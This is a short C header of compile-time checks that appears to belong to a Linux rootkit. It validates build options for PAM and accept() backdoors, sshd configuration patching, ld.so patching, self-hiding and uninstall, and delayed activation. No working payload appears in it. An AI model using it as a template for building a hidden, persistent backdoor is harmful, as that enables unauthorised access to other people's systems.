#if !defined USE_PAM_BD && !defined USE_ACCEPT_BD
#warning "No backdoor method selected"
#endif

#if defined HARD_PATCH && defined SOFT_PATCH
#error "sshd HARD_PATCH & SOFT_PATCH cannot be defined simultaneously"
#endif
#if (!defined HARD_PATCH && !defined SOFT_PATCH) && defined USE_PAM_BD
#warning "USE_PAM_BD: There is no PATCH_SSHD_CONFIG defined"
#endif
#if (defined HARD_PATCH || defined SOFT_PATCH) && !defined USE_PAM_BD
#warning "A PATCH_SSHD_CONFIG is defined while USE_PAM_BD is not"
#endif

#if !defined PATCH_LD && !defined NO_PROTECT_LDSO
#error "PATCH_LD: undefined while NO_PROTECT_LDSO is not"
#endif

#if defined ATTR_CHANGE_TIME && !defined USE_MAGIC_ATTR
#warning "ATTR_CHANGE_TIME: defined without USE_MAGIC_ATTR"
#endif

#if defined UNINSTALL_MY_ASS && !defined HIDE_MY_ASS
#error "UNINSTALL_MY_ASS: cannot be defined without HIDE_MY_ASS"
#endif

#if defined AFTER_HOURS && defined AFTER_DAYS
#error "AFTER_HOURS & AFTER_DAYS cannot be defined simultaneously, pick one"
#endif